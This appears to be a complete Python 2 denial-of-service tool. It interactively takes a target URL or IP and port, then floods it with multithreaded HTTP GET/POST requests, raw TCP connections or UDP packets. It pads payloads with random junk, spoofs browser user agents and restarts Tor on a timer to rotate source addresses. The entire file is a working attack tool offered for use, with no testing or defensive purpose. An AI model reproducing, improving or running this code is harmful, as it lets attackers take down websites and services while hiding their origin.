import socket,random,time,os,sys,threading,httplib
i=0
li=['1','2','3','4','5','6','7','8','9','0','a','A','b','B','c','C','d','D','e','E','f','F','g','G','h','H','i','I','j','J','k','K','l','L','m','M','n','N','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']
os.system('clear')

def h(s):
    l=''
    for i in range(0, s):
        l+=random.choice(li)
    return(l)

def rc():
 print '\n\033[92m[*]creating strings...'
 global lis
 lis=[]
 for v in range(10000):
  q='search='+(h(random.randint(1,3))*1000)
  lis.append(q)
 return(lis)

rc()
ua=["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"]
n=0
if (sys.platform == "win32") or( sys.platform == "win64"):
			print'\033[91m[-]Windows is not supported, you will attack without switching'
			k=0
else:
  os.system('service tor start')
  os.system('clear')
  while n<1:
   try:
    k=input('\033[92mTIME BETWEEN SWITCHES IN SECONDS:(0 for no switching if you are using switching on other terminal)\n>')
    n+=1
   except Exception as e:
    print'\033[91m',e

while n<2:
 try:
  a=input('\033[92m\n\nATTACK LAYER:\n 1-LAYER 7(for URL)\n 2-LAYER 4(IP)\n>')
  if (a==1) or (a==2):
   n+=1
 except Exception as e:
  '\033[91m',e
if (a==1):
 while n<3:
  try:
   u=raw_input('\n\033[92mTARGET URL(www.example.com):\n>')
   socket.gethostbyname(u)
   n+=1
  except Exception as e:
   print'\033[91m',e
 while n<4:
  try:
   v=input('\n\033[92mMETHOD:\n 1-GET\n 2-POST\n>')
   if (v==1) or (v==2):
    mt=0
    n+=1
  except Exception as e:
   print'\033[91m',e
elif (a==2):
 n=10
 while n<11:
  try:
   u=raw_input('\n\033[92mTARGET IP:\n>')
   socket.gethostbyname(u)
   n+=1
  except Exception as e:
   print'\033[91m',e
 while n<12:
  try:
   mt=input('\n\033[92mMETHOD:\n 1-HTTP: GET\n 2-HTTP: POST\n 3-TCP\n 4-UDP\n>')
   if mt in [1,2,3,4]:
    n+=1
  except Exception as e:
   print'\033[91m',e
n=20
while n<21:
 try:
  p=input('\n\033[92mPORT:\n>')
  n+=1
 except Exception as e:
   print'\033[91m',e
if (mt!=4):
 while n<22:
  try:
   ti=input('\n\033[92mTIMEOUT:\n>')
   n+=1
  except Exception as e:
   print'\033[91m',e
 while n<23:
  try:
   th=input('\n\033[92mTHREADS: (<1000)\n>')
   if (th<1000) and (th>0):
    n+=1
  except Exception as e:
   print'\033[91m',e
print'\n<--ATTACK HAS STARTED!!!-->\n'
def l4():
 global i
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(ti)
 s.connect((u,p))
 if mt==1:
  s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
  s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
  s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
 elif mt==2:
  s.send("POST / HTTP/1.1\r\n".encode("utf-8"))
  s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
  s.send("Content-type: application/x-www-form-urlencoded\r\n".encode("utf-8"))
  s.send("Accept: text/plain\r\n".encode("utf-8"))
  s.send(random.choice(lis))
 elif mt==3:
  s.send(random.choice(lis))
 i+=1
 print 'Created Sockets:',i
 return s

def l7():
 global i
 headers = {"User-Agent": random.choice(ua),
	          "Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain",}
 try:
  conn=httplib.HTTPConnection(u,p,timeout=ti)
  if v==1:
   conn.request("GET", '/',"User-Agent: {}".format(random.choice(ua)))
  elif v==2:
   params = random.choice(lis)
   conn.request("POST", '/', params, headers)
  i+=1
  print'packets sent:',i
 except socket.error as e:
  print e

class HTTPThread(threading.Thread):
 def run(self):
  try:
   if (a==1):
      while True:
         l7()
   elif (a==2):
      while True:
       try:
         l4()
       except socket.error as e:
         pass
  except Exception as e:
     pass

class swi(threading.Thread):
 def run(self):
   while True:
			time.sleep(k)
			os.system('service tor restart')
			os.system('clear')
			
if 	(k!=0):
 t=swi()
 t.start()

if (mt!=4):
 for x in range(th):
  t=HTTPThread()
  t.start()

elif (mt==4):
  while True:
   s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
   try:
    s.connect((u,p))
    s.sendto((random.choice(lis)),(u,p))
    i+=1
    if i%1000==0:
     print 'packets sent:',i
   except socket.error as e:
    pass